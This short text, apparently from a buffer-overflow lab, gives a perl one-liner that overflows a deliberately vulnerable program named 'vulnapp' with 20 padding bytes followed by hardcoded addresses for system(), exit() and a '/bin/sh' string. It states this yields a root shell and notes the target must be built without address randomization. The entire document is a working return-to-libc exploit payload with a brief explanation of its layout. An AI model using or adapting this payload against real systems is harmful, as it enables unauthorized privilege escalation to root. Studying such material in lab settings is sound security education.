./vulnapp "’perl -e ’printf "A" x 20 . "\x78\xfc\xff\xbf" . "\xb0\xd7\xe4\xb7" . "\xf0\x03\xe4\xb7" . "\xc0\x99\x04\x08"’’"

gets you a rootshell

where

./vulnapp "’perl -e ’printf "A" x 20 . "Random Address" . "Adress of System()" . "address of exit()" . " /bin/sh "’’"


has to be compiled with the flags in the makefile to prevent address randomization.